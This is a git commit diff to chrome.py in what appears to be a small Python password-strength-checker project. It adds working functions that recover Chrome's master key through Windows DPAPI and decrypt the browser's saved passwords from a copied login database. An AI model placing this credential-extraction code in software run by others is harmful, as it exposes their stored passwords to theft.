2d2a2e07d142cd923004eb4010fd53e77f5fe8a5
egzongashi00 <egzongashi00>
2021-02-12 10:38:43 +0100

    added def get_secret_key(), def decrypt_payload(cipher, payload), def generate_cipher(aes_key, iv), def decrypt_password(ciphertext, secret_key), def get_db_connection(chrome_path_login_db)

--- chrome.py
+++ chrome.py
@@ -1,7 +1,15 @@
+import os
+import sys
+import json
+import base64
+import sqlite3
+import win32crypt
+from Cryptodome.Cipher import AES
+import shutil
+import csv
 from tkinter import *
-import matplotlib.pyplot as plt
 import re
-
+import matplotlib.pyplot as plt
 
 def check(password):
     if len(password) < 8:
@@ -17,11 +25,60 @@ def check(password):
     return sop
 
 
-print(check("e"))  # ka vetem me pak se 8 karaktere
-print(check("eeeeeeee"))  # ka me shume se 8 karaktere
-print(check("1eeeeeee"))  # ka me shume se 8 karaktere + ka numer
-print(check("1#eeeeee"))  # ka me shume se 8 karaktere + ka numer + ka special karakter
-print(check("12#Leeee"))  # ka me shume se 8 karaktere + ka numer + ka karakter special + ka uppercase shkronje
+CHROME_PATH_LOCAL_STATE = r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE'])
+CHROME_PATH = r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE'])
+
+
+def get_secret_key():
+    try:
+        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        secret_key = secret_key[5:]
+        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        return secret_key
+    except Exception as e:
+        print("%s" % str(e))
+        print("[ERR] Secret key couldn't be found!")
+        return None
+
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+
+def decrypt_password(ciphertext, secret_key):
+    try:
+        # (3-a) Initialisation vector for AES decryption
+        initialisation_vector = ciphertext[3:15]
+        # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
+        # Encrypted password is 192 bits
+        encrypted_password = ciphertext[15:-16]
+        # (4) Build the cipher to decrypt the ciphertext
+        cipher = generate_cipher(secret_key, initialisation_vector)
+        decrypted_pass = decrypt_payload(cipher, encrypted_password)
+        decrypted_pass = decrypted_pass.decode()
+        return decrypted_pass
+    except Exception as e:
+        print("%s" % str(e))
+        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
+        return ""
+
+
+def get_db_connection(chrome_path_login_db):
+    try:
+        print(chrome_path_login_db)
+        shutil.copy2(chrome_path_login_db, "Loginvault.db")
+        return sqlite3.connect("Loginvault.db")
+    except Exception as e:
+        print("%s" % str(e))
+        print("[ERR] Chrome database cannot be found")
+        return None
 
 
 class Table:
